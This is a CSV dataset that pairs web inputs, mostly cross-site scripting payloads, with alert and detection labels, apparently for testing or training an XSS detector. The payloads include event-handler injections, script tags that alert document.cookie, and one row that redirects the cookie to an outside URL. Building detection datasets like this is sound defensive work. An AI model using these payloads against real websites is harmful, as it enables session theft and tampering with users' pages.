Payload,Alert,Detected
"pt=2&sp=2&ycs=%2BqWEgB7wUAc%3D&qs=06oENya4ZGJbKUjvjwGtnG6lv5viRy7eDPDTOS9W-A4i5B6Eb7<br/>wQL9rBk7gdfqacjQNjjI_Y_0zI2HHPHI08-huHhEzofZpLPMhLhvaj5ooN2zseleNY6O_aj70yQKP2VHFm7L9aSLVEiZBsYMZPIY<br/>spfNlRjvRJdccPwIl6fnT-tg_KnijcoEzGTu_Zbr_5vQSskeF9LpJGrntRRV4B3eFvvnzduHjUySH30QNgAngpVqXKdXE5P8-Y2N<br/>qO6iHrw07J6s1gh0yxpw8vHhHLfMaUy5ZdBzR0yyYgLX0Q..,YT0z&vid=1206254279_1X01X1826228314&rpt=2&kt=1",False,2
"pt=2&sp=2&ycs=%2BqWEgB7wUAc%3D&qs=06oENya4ZGJbKUjvjwGtnG6lv5viRy7eDPDTOS9W-A4i5B6Eb7<br/>wQL9rBk7gdfqacjQNjjI_Y_0zI2HHPHI08-huHhEzofZpLPMhLhvaj5ooN2zseleNY6O_aj70yQKP2VHFm7L9aSLVEiZBsYMZPIY<br/>spfNlRjvRJdccPwIl6fnT-tg_KnijcoEzGTu_Zbr_5vQSskeF9LpJGrntRRV4B3eFvvnzduHjUySH30QNgAngpVqXKdXE5P8-Y2N<br/>qO6iHrw07J6s1gh0yxpw8vHhHLfMaUy5ZdBzR0yyYgLX0Q..,YT0z&vid=1206254279_1X01X1826228314&rpt=2&kt=1",False,0
http&next=http%3A%2F%2Fxssed.com,False,2
http&next=http%3A%2F%2Fxssed.com,False,0
<rb onbeforescriptexecute=alert(1)><script>1</script>,False,2
<rb onbeforescriptexecute=alert(1)><script>1</script>,False,0
echo=<script>window.location='http://www.google.com/index.php?cook<br/>ie='%2Bdocument.cookie;</script>,False,2
echo=<script>window.location='http://www.google.com/index.php?cook<br/>ie='%2Bdocument.cookie;</script>,False,0
"<thead oncut=""alert(1)"" contenteditable>test</thead>",False,2
"<thead oncut=""alert(1)"" contenteditable>test</thead>",False,0
<sVg oNloaD=write()>,False,2
<sVg oNloaD=write()>,False,0
id=1484%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,False,2
id=1484%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,False,0
keyword=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscr<br/>ipt%3E&tag_name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&category=0&files_type<br/>%5B%5D=1&sort_by=0&search=Search,False,2
keyword=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscr<br/>ipt%3E&tag_name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&category=0&files_type<br/>%5B%5D=1&sort_by=0&search=Search,False,0
<frameset onload=javascript:javascript:alert(6159)></frameset>,False,2
<frameset onload=javascript:javascript:alert(6159)></frameset>,False,0
search=x%22%3E%27%3E<br/>%3CscRipT%3Ealert%28123%29%3C%2FScRIpT%3E%22,False,2
search=x%22%3E%27%3E<br/>%3CscRipT%3Ealert%28123%29%3C%2FScRIpT%3E%22,False,0
ID='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E<br/>%3Cmarquee%3EWhiteHat%20Forever%3C/marque%3E,False,2
ID='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E<br/>%3Cmarquee%3EWhiteHat%20Forever%3C/marque%3E,False,0
"<hr onclick=""alert(1)"">AnonKryptiQuz</hr>",False,2
"<hr onclick=""alert(1)"">AnonKryptiQuz</hr>",False,0
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",False,2
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",False,0
"<slot oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,2
"<slot oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,0
"<style onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></style>",False,2
"<style onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></style>",False,0
"search_string=<<SCRIPT>alert(""ResisTance"");//<</SCRIPT>",False,2
"search_string=<<SCRIPT>alert(""ResisTance"");//<</SCRIPT>",False,0
<hr onpointerover=alert(1)>XSS</hr>,False,2
<hr onpointerover=alert(1)>XSS</hr>,False,0
"where=""><script>alert(""Game%20Over!:("")</script>",False,2
"where=""><script>alert(""Game%20Over!:("")</script>",False,0
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionstart=alert(1)></nobr>",False,2
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionstart=alert(1)></nobr>",False,0
nID=register;lID=1,False,2
nID=register;lID=1,False,0
"<animatemotion onmouseenter=""alert(1)"" style=display:block>test</animatemotion>",False,2
"<animatemotion onmouseenter=""alert(1)"" style=display:block>test</animatemotion>",False,0
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",False,2
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",False,0
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",False,2
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",False,0
